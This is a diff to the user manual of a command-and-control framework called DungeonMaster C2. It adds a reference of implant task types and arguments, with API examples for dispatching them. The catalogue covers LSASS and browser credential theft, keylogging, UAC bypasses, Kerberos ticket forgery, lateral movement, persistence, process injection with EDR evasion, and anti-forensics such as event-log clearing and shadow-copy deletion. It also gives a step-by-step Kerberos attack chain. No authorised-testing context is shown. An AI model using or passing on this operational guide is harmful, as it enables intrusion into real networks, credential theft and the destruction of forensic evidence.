@@ -1,7 +1,7 @@
 # DungeonMaster C2 Framework — User Manual
 
-**Version:** 0.1 (Phase 1)
-**Last updated:** 2026-06-23
+**Version:** 1.0
+**Last updated:** 2026-07-26
 **Repository:** github.com/BroJustLeaveMeAlone/DungeonMaster-C2
 
 ---
@@ -152,7 +152,7 @@ All six containers should show `healthy` or `running`:
 - `redis` — session bus
 - `minio` — artifact/evidence store
 - `server` — Go team server
-- `ai` — Python TTP engine (optional, can be ignored if no API key)
+- `ttp-ranker` — Python TTP engine (optional, can be ignored if no API key)
 - `ui` — React UI behind Nginx
 
 **5. Access the UI.**
@@ -560,86 +560,301 @@ queued  →  sent  →  complete
        →  cancelled  (operator cancels before agent fetches)
 ```
 
-Tasks with `requires_confirmation = true` are not dispatched to the agent until an operator explicitly confirms them. This flag is not exposed in the current UI but is present in the API.
+### Wire format
 
-### Current task types
+All task args are base64-encoded JSON. The UI handles encoding automatically. For direct API calls:
 
-#### `shell`
-
-Execute a command via `cmd /C` on Windows or `sh -c` on other platforms.
-
-**Args:** JSON object — `{"cmd": "<command string>"}`
-
-**Output:** Combined stdout + stderr as raw bytes. Both streams are appended; there is no separate stderr channel.
-
-**Example (API):**
-```
-curl -X POST http://localhost:8080/api/v1/tasks \
-  -H 'Authorization: Bearer <TOKEN>' \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "session_id": "<SESSION_UUID>",
-    "type": "shell",
-    "args": "'$(echo '{"cmd":"whoami /all"}' | base64)'"
-  }'
+```powershell
+# PowerShell
+$args = @{ method = "ls"; path = "C:\Users" } | ConvertTo-Json -Compress
+$argsB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args))
+$body = @{ session_id = "<SID>"; type = "file"; args = $argsB64 } | ConvertTo-Json
+Invoke-RestMethod -Uri http://localhost:8080/api/v1/tasks -Method POST `
+  -Headers @{Authorization="Bearer $token"} -ContentType "application/json" -Body $body
 ```
 
-Note: the `args` field in the API is a raw `[]byte` value encoded as base64 JSON. The UI handles this encoding automatically.
+The `args` field is a **base64-encoded JSON object**. The `method` sub-field selects the operation within each task type.
 
-**Constraints:**
-- Commands run synchronously in the agent. Long-running commands (e.g., `netstat -ano` with routing table scan) will block the poll loop for that duration.
-- No PTY. Interactive programs, color output, and progress bars do not render correctly.
-- Exit code is not currently surfaced separately — check stdout for error messages.
+### Quick reference
 
-#### `sleep`
-
-Acknowledge a sleep reconfiguration. The actual sleep interval is controlled by the `sleep_seconds` and `jitter_pct` fields in the poll response, which the server sets based on the session's current config.
-
-**Args:** JSON object — `{"seconds": N}` (informational only in Phase 1)
-
-**Output:** `sleep updated`
-
-To change an agent's sleep interval, use `PATCH /api/v1/sessions/{id}/sleep`:
-
-```
-curl -X PATCH http://localhost:8080/api/v1/sessions/<SESSION_ID>/sleep \
-  -H 'Authorization: Bearer <TOKEN>' \
-  -H 'Content-Type: application/json' \
-  -d '{"sleep_seconds": 60, "jitter_pct": 30}'
-```
-
-Valid range: `sleep_seconds` 1–86400; `jitter_pct` 0–50.
-
-#### `exit`
-
-Cause the agent to exit cleanly without running `evasion::cleanup()`. Returns `exiting` as output.
-
-#### `upload`
-
-Exfiltrate a file from the target to the evidence store.
-
-**Args:** JSON object — `{"path": "C:\\path\\to\\file.txt"}`
-
-**Output:** Raw file bytes. The server stores them as evidence in MinIO at `evidence/{session_id}/{task_id}.bin`.
-
-The agent reads the file and returns it as task output bytes. There is no size limit enforced on the agent side, but the C2 server reads a maximum of 10 MB per callback (`io.LimitReader(r.Body, 10*1024*1024)`).
-
-#### `download`
-
-Write a file to the target from the operator.
-
-**Args:** JSON object — `{"path": "C:\\dest\\path.exe", "data": "<base64-encoded file bytes>"}`
-
-**Output:** `written N bytes to C:\dest\path.exe` on success, or an error message.
-
-The `data` field must be standard base64 (RFC 4648). Encode your file before constructing the task args.
-
-### Planned task types (Phase 3)
-
-| Type | Description |
+| Type | Methods |
 |---|---|
-| `module` | Load and execute a Position-Independent Code (PIC) blob or Beacon Object File (BOF) in process |
-| `inject` | Inject shellcode into a remote process |
+| `shell` | *(no method field)* — raw command |
+| `file` | `ls` `read` `write` `rm` `mkdir` `mv` `cp` `info` |
+| `enum` | `processes` `services` `tasks` `sessions` `shares` `users` `groups` `localadmins` `computer` `domain` `routes` `netdiscovery` `bloodhound` `acl` `unconstrained-deleg` |
+| `collect` | `clipboard` `dpapi` `vault` `wifi` `browser-creds` `browser-history` `file-search` `screen-record` `keylog-start` `keylog-stop` `keylog-dump` `ssh-keys` `certs` `email` |
+| `priv` | `sam-dump` `token-steal` `token-make` `potato` `pipe-impersonate` `uac-fodhelper` `uac-eventvwr` `uac-sdclt` `unquoted-paths` `dll-hijack` `always-install-elevated` `shadow-creds` `rbcd` `adcs` `acl-abuse` `s4u` |
+| `lateral` | `smb-psexec` `wmi` `winrm` `dcom` `rdp-pth` `adidns` |
+| `persist` | `reg` `reg-rm` `task` `svc` `svc-rm` `startup` `com` `wmi` |
+| `antifor` | `timestomp` `indicator-rm` `eventlog-clear` `eventlog-del` `shadow-delete` |
+| `cred` | `lsass` `lsass-pss` `lsass-syscall` `kerberoast` `asrep-roast` `ptt` `pth` `opth` `dcsync` `golden-ticket` `silver-ticket` `diamond-ticket` |
+| `inject` | `classic` `apc` `classic-spawn` `hollow` `hijack` `stomp` |
+| `sleep` | *(no method)* — update beacon interval |
+| `kill` | *(no method)* — terminate agent |
+| `screenshot` | *(no method)* — capture desktop |
+| `upload` | *(no method)* — read file from target |
+| `download` | *(no method)* — write file to target |
+| `relay_start` / `relay_stop` | SMB relay chain |
+
+---
+
+### `shell`
+
+Execute a command via `cmd /C`.
+
+**Args:** `{"cmd": "<command string>"}`
+
+**Output:** Combined stdout + stderr. No PTY — interactive programs don't work. Exit code not surfaced separately.
+
+---
+
+### `sleep`
+
+Update the agent's beacon interval.
+
+**Args:** `{"seconds": N}`
+
+**Output:** `"sleep updated"`
+
+To change sleep via API: `PATCH /api/v1/sessions/{id}/sleep` with `{"sleep_seconds": N, "jitter_pct": N}`.
+
+---
+
+### `kill`
+
+Terminate the agent. No args. Agent exits after sending the response.
+
+---
+
+### `screenshot`
+
+Capture the desktop. No args. **Output:** Raw BMP bytes.
+
+---
+
+### `upload`
+
+Read a file from the target.
+
+**Args:** `{"path": "C:\\path\\to\\file"}`
+
+**Output:** Raw file bytes, stored as evidence in MinIO.
+
+---
+
+### `download`
+
+Write a file to the target.
+
+**Args:** `{"path": "C:\\dest\\path.exe", "data": "<base64 file bytes>"}`
+
+**Output:** `"written N bytes to path"`
+
+---
+
+### `file` — File Manager
+
+| Method | Required args | Optional args | Output |
+|---|---|---|---|
+| `ls` | — | `path` (default `.`) | One entry per line: name padded to 50 chars + `<DIR>` or size |
+| `read` | `path` | — | Base64-encoded file bytes |
+| `write` | `path`, `data` (base64) | — | `"written N bytes to path"` |
+| `rm` | `path` | — | `"removed {path}"` |
+| `mkdir` | `path` | — | `"created {path}"` |
+| `mv` | `src`, `dst` | — | `"moved src -> dst"` |
+| `cp` | `src`, `dst` | — | `"copied N bytes: src -> dst"` |
+| `info` | `path` | — | Multi-line: path, type, size, readonly |
+
+---
+
+### `enum` — Enumeration
+
+#### Host enumeration
+
+| Method | Required args | Optional args | Output |
+|---|---|---|---|
+| `processes` | — | — | TSV: `PID\tPPID\tThreads\tName` |
+| `services` | — | — | TSV: `Name\tDisplayName\tStatus\tPID` |
+| `tasks` | — | — | One scheduled task path per line |
+| `sessions` | — | — | TSV: `Client\tUser\tTime(s)\tIdleTime(s)` |
+| `shares` | — | `host` (default: localhost) | TSV: `Share\tType\tRemark` |
+| `users` | — | `host` | One username per line |
+| `groups` | — | — | One group name per line |
+| `localadmins` | — | — | One member per line |
+| `computer` | — | — | Full host profile: hostname, OS, arch, patches, AV |
+| `domain` | — | — | Domain trusts + workstation config |
+| `routes` | — | — | TSV: `Dest/Prefix\tNextHop\tIfIndex\tMetric` |
+| `netdiscovery` | `target` (CIDR or host) | `ports` (csv, default: common), `timeout_ms` (default: 300) | TSV: `Host\tPort\tStatus` (open only) |
+
+#### AD enumeration (requires domain context)
+
+| Method | Required args | Optional args | Output |
+|---|---|---|---|
+| `bloodhound` | — | `domain`, `dc`, `user`, `pass` | JSON: users, computers, groups, trusts, GPOs, CAs + stats |
+| `acl` | — | `domain`, `dc`, `user`, `pass` | JSON: AD objects with their ACEs and rights |
+| `unconstrained-deleg` | — | `domain`, `dc`, `user`, `pass` | JSON: computers and users with unconstrained delegation |
+
+For AD methods, `domain` defaults to `%USERDNSDOMAIN%` and `dc` defaults to the domain FQDN. Pass `user`/`pass` explicitly if the current session doesn't have LDAP access.
+
+---
+
+### `collect` — Collection
+
+| Method | Required args | Optional args | Output |
+|---|---|---|---|
+| `clipboard` | — | — | Clipboard text (or empty message) |
+| `dpapi` | `blob` (base64 DPAPI blob) | — | Decrypted plaintext bytes |
+| `vault` | — | — | TSV: `Target\tUsername\tSecret` |
+| `wifi` | — | — | `SSID: name\tKey: pass` per profile |
+| `browser-creds` | — | `browser` (`chrome`/`edge`/`brave`, default: `chrome`) | TSV: `URL\tUsername\tPassword` |
+| `browser-history` | — | `browser`, `limit` (default: 100) | TSV: `URL\tTitle\tVisitCount` |
+| `file-search` | — | `path` (default: `C:\Users`), `pattern` (default: `*.txt`), `grep`, `max` (default: 200) | One matching path per line |
+| `screen-record` | — | `count` (default: 5), `interval_ms` (default: 3000) | JSON array of base64 BMP strings |
+| `keylog-start` | — | — | `"keylog: started"` |
+| `keylog-stop` | — | — | `"keylog: stopped"` |
+| `keylog-dump` | — | — | Captured keystrokes (cleared after dump) |
+| `ssh-keys` | — | — | JSON: ssh_files (path, size, content_b64), putty_sessions |
+| `certs` | — | — | JSON: certs from MY/CA/ROOT stores + PFX export |
+| `email` | — | — | JSON: PST/OST/NST files (path, size) |
+
+---
+
+### `priv` — Privilege Escalation
+
+#### Local privilege escalation
+
+| Method | Required args | Optional args | Notes |
+|---|---|---|---|
+| `sam-dump` | — | — | Dumps SAM/SYSTEM/SECURITY hives as base64. Needs SeBackupPrivilege or local admin. |
+| `token-steal` | — | `spawn` (exe path) | Steals SYSTEM token. Without `spawn`: impersonates in-place. With `spawn`: launches exe as SYSTEM. |
+| `token-make` | `user`, `pass` | `domain` (default `.`) | Creates logon token from explicit creds and impersonates. |
+| `potato` | — | `cmd` | RogueWinRM / schtasks DCOM trigger to get SYSTEM impersonation. |
+| `pipe-impersonate` | — | — | Opens a named pipe and impersonates the first privileged client. Waits up to 60 seconds. |
+| `uac-fodhelper` | `cmd` | — | UAC bypass via ms-settings shell handler. |
+| `uac-eventvwr` | `cmd` | — | UAC bypass via mmc application association. |
+| `uac-sdclt` | `cmd` | — | UAC bypass via sdclt.exe isolation provider. |
+| `unquoted-paths` | — | — | Scans services for unquoted paths with spaces. Reports writable hijack locations. |
+| `dll-hijack` | — | — | Finds writable %PATH% dirs and missing DLL targets. |
+| `always-install-elevated` | — | — | Checks both HKLM and HKCU AlwaysInstallElevated keys. Reports `[VULNERABLE]` if set. |
+
+#### AD privilege escalation (requires domain context)
+
+| Method | Required args | Optional args | Notes |
+|---|---|---|---|
+| `shadow-creds` | `target` (sAMAccountName) | `domain`, `dc`, `user`, `pass`, `remove` (bool) | Adds/removes msDS-KeyCredentialLink. Output includes public/private key pair for follow-on auth. |
+| `rbcd` | `target`, `attacker_sid` | `domain`, `dc`, `user`, `pass`, `remove` (bool) | Writes msDS-AllowedToActOnBehalfOfOtherIdentity. Use with `priv/s4u` for follow-on exploitation. |
+| `adcs` | — | `domain`, `dc`, `user`, `pass` | Enumerates certificate templates for ESC1/2/3/9/10. Returns vulnerable templates with severity ratings. |
+| `acl-abuse` | `target` | `action` (`add`/`list`, default `add`), `trustee_sid`, `right` (`write-dacl`/`generic-all`/`dcsync`/etc.), `domain`, `dc`, `user`, `pass` | Appends ACE to target object DACL. Use `list` to view existing ACEs first. |
+| `s4u` | — | `domain`, `dc`, `user`, `pass`, `target` | Enumerates constrained delegation (msDS-AllowedToDelegateTo). Identifies S4U2Self / S4U2Proxy abuse paths. |
+
+---
+
+### `lateral` — Lateral Movement
+
+| Method | Required args | Optional args | Notes |
+|---|---|---|---|
+| `smb-psexec` | `host`, `cmd` | `timeout_s` (default 30), `task_name` | Service-based exec via SCM. Returns command output. Runs as SYSTEM. |
+| `wmi` | `host`, `cmd` | `user`, `pass` | Win32_Process.Create via WMI. Fire-and-forget if no output redirect in cmd. |
+| `winrm` | `host`, `cmd` | `user`, `pass` | winrs execution. Requires WinRM enabled on target. |
+| `dcom` | `host`, `cmd` | `user`, `pass` | DCOM execution (routes through WMI path). Fire-and-forget. |
+| `rdp-pth` | `host` | `user`, `domain`, `pass`, `check_only` (bool) | RDP via Restricted Admin mode. Use `check_only=true` to check if the target supports it without connecting. |
+| `adidns` | `action` (`add`/`remove`/`list`) | `name`, `ip` (required for add), `zone`, `ttl`, `domain`, `dc`, `user`, `pass` | Manage AD-Integrated DNS records for rogue A records / relay attacks. |
+
+---
+
+### `persist` — Persistence
+
+| Method | Required args | Optional args | Notes |
+|---|---|---|---|
+| `reg` | `name`, `path` | `hive` (`hkcu`/`hklm`, default `hkcu`) | Adds Run key entry. |
+| `reg-rm` | `name` | `hive` (default `hkcu`) | Removes Run key entry. |
+| `task` | `name`, `path` | `trigger` (default `ONLOGON`), `user` (default `SYSTEM`) | Creates scheduled task via schtasks. |
+| `svc` | `name`, `path` | `display` | Creates and starts a Windows service. |
+| `svc-rm` | `name` | — | Stops and deletes a service. |
+| `startup` | `src`, `name` | — | Copies file into user startup folder. |
+| `com` | `clsid`, `dll` | — | Hijacks COM CLSID InprocServer32/LocalServer32. |
+| `wmi` | `name`, `cmd` | — | Creates WMI event subscription for persistence. |
+
+---
+
+### `antifor` — Anti-Forensics
+
+| Method | Required args | Optional args | Notes |
+|---|---|---|---|
+| `timestomp` | `path` | `created`, `modified`, `accessed` (format: `YYYY-MM-DD HH:MM:SS`), `copy_from` | Modifies NTFS timestamps. Use `copy_from` to clone timestamps from a reference file. |
+| `indicator-rm` | `path` | — | Zero-fills then deletes the file. |
+| `eventlog-clear` | — | `channel` (default `Security`) | Clears a Windows event log channel. |
+| `eventlog-del` | `record_id` | `channel` (default `Security`) | Removes a single event record (clears + reimports all others). |
+| `shadow-delete` | — | — | Deletes all VSS shadow copies via vssadmin. |
+
+---
+
+### `cred` — Credential Access
+
+#### LSASS dumps
+
+All three methods require local admin. Output is XOR-encoded MDMP bytes — decode with `output[i] ^= (i & 0xFF)`.
+
+| Method | Notes |
+|---|---|
+| `lsass` | Direct MiniDumpWriteDump. Highest EDR signal. **Blocked by Windows Defender behavioral detection.** |
+| `lsass-pss` | PssCaptureSnapshot API. Lower EDR signal than direct OpenProcess. |
+| `lsass-syscall` | Indirect NT syscalls. Bypasses EDR hooks on OpenProcess / ReadProcessMemory. |
+
+#### Kerberos attacks
+
+| Method | Required args | Optional args | Notes |
+|---|---|---|---|
+| `kerberoast` | — | `domain`, `dc`, `user`, `pass` | Returns TGS tickets for SPN accounts. Crack offline with hashcat mode 13100. |
+| `asrep-roast` | — | `domain`, `dc`, `user`, `pass` | Finds pre-auth disabled accounts and returns AS-REP hashes. Crack with hashcat mode 18200. |
+| `ptt` | `ticket_b64` (kirbi) | `purge` (bool) | Injects a Kerberos ticket into the current logon session via LsaCallAuthenticationPackage. |
+| `pth` | `user`, `pass` | `domain` (default `.`), `cmd` (default `cmd.exe`) | Pass-the-Hash via CreateProcessWithLogonW. Spawns a process using the credentials for network auth. |
+| `opth` | `domain`, `user`, `ntlm` (32-char hex) | `aes256_key` (64-char hex), `dc`, `cmd` | Overpass-the-Hash. Sends raw AS-REQ to DC:88 using the NT hash, injects the returned TGT. Optionally runs a command afterward. |
+| `dcsync` | — | `user` (target account, default `krbtgt`), `domain`, `dc`, `bind_user`, `bind_pass` | Verifies DCSync capability and retrieves target account LDAP attributes. |
+| `golden-ticket` | `domain`, `sid`, `krbtgt_ntlm` | `username`, `user_id`, `lifetime_hours`, `groups` | Forges a Golden TGT offline. No DC contact. Pass output `ticket_b64` to `cred/ptt` to use it. |
+| `silver-ticket` | `domain`, `sid`, `service_ntlm`, `target` | `service` (default `cifs`), `username`, `user_id`, `lifetime_hours`, `groups` | Forges a Silver TGS for a specific service. No DC contact. Pass output to `cred/ptt`. |
+| `diamond-ticket` | `domain`, `sid`, `krbtgt_ntlm` | `groups`, `lifetime_hours`, `username` | Like a Golden Ticket but using the current user's real identity. Harder to detect than pure golden tickets. |
+
+**Typical Kerberos attack chain:**
+
+```
+1. cred/dcsync        → confirm DCSync rights
+2. cred/kerberoast    → get TGS hashes → crack → obtain account passwords
+3. cred/opth ntlm=<hash> cmd="dir \\dc01\c$"  → get TGT + domain access
+4. cred/golden-ticket → forge TGT for any user
+5. cred/ptt           → inject forged ticket into session
+```
+
+---
+
+### `inject` — Process Injection
+
+| Method | Required args | Optional args | Notes |
+|---|---|---|---|
+| `classic` | `pid`, `shellcode` (base64) | — | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread |
+| `apc` | `target` (exe path), `shellcode` (base64) | — | Spawn suspended, queue APC to all threads, resume |
+| `classic-spawn` | `target` (exe path), `shellcode` (base64) | — | Spawn new process + classic remote thread injection |
+| `hollow` | `target` (exe path), `payload` (base64 PE) | — | Process hollowing — replaces image of suspended process |
+| `hijack` | `pid`, `shellcode` (base64) | — | Suspend existing thread, redirect RIP, resume |
+| `stomp` | `pid`, `shellcode` (base64) | — | Overwrite loaded DLL .text section. Requires `inject-stomp` feature flag at build time. |
+
+---
+
+### `relay_start` / `relay_stop` — SMB Relay Chain
+
+Chain a downstream implant through this agent over a named pipe.
+
+**relay_start args:**
+
+| Field | Required | Default | Notes |
+|---|---|---|---|
+| `pipe` | yes | — | Named pipe name (e.g. `svcctl`) |
+| `c2_host` | yes | — | Upstream C2 hostname or IP |
+| `c2_port` | yes | — | Upstream C2 port |
+| `reg_path` | no | `/r` | Agent registration path |
+| `poll_path` | no | `/c` | Agent poll path |
+
+**relay_stop:** No args. Stops the active relay.
 
 ---
 
